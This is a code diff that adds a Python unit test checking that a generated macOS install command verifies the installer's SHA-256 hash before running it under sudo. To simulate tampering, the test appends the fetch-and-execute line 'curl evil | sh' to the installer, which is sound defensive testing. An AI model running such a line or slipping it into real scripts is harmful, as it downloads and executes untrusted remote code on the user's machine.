@@ -113,6 +113,23 @@ class BagTest(unittest.TestCase):
                                  capture_output=True, text=True).stdout
         self.assertEqual(payload, open(os.path.join(SKILL, "scripts", "mac", "airlock.py")).read())
 
+    @unittest.skipUnless(shutil.which("shasum"), "needs shasum (as on macOS)")
+    def test_bundle_mac_command_checks_hash_before_sudo(self):
+        os.makedirs(self.bag_home, exist_ok=True)
+        open(os.path.join(self.bag_home, "id_ed25519.pub"), "w").write("ssh-ed25519 AAAATEST agent\n")
+        open(os.path.join(self.bag_home, "id_ed25519"), "w").write("x")
+        p = self.bag("bundle", "--gitlab-url", "https://git.corp.local/grp/proj.git")
+        line = [l for l in (p.stdout + p.stderr).splitlines() if "On the Mac run:" in l][0]
+        cmd = line.split("On the Mac run:", 1)[1].strip()
+        check, _, run = cmd.partition(" && sudo ")
+        self.assertIn("shasum -a 256 -c", check)
+        self.assertEqual(run, "bash blacklake-airlock-installer.sh")
+        d = os.path.join(self.bag_home, "bundle")
+        self.assertEqual(subprocess.run(["bash", "-c", check], cwd=d, capture_output=True).returncode, 0)
+        with open(os.path.join(d, "blacklake-airlock-installer.sh"), "a") as fh:
+            fh.write("\ncurl evil | sh\n")
+        self.assertNotEqual(subprocess.run(["bash", "-c", check], cwd=d, capture_output=True).returncode, 0)
+
 
 class UpdateTest(unittest.TestCase):
     """bag.sh update: pulls the skill from its source repo and reinstalls it, recording provenance."""
